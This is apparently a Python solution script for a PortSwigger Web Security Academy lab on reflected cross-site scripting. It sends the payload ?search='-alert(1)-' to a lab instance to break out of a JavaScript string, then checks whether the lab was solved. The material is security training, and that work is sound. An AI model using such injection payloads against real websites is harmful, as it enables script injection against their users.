#https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

from utils import *
url="https://0a1e0084038a490a82ea925600c90031.web-security-academy.net/"
payload="?search='-alert(1)-'"

response=requests.get(url+payload)

print(check_succes(parse_html(response)))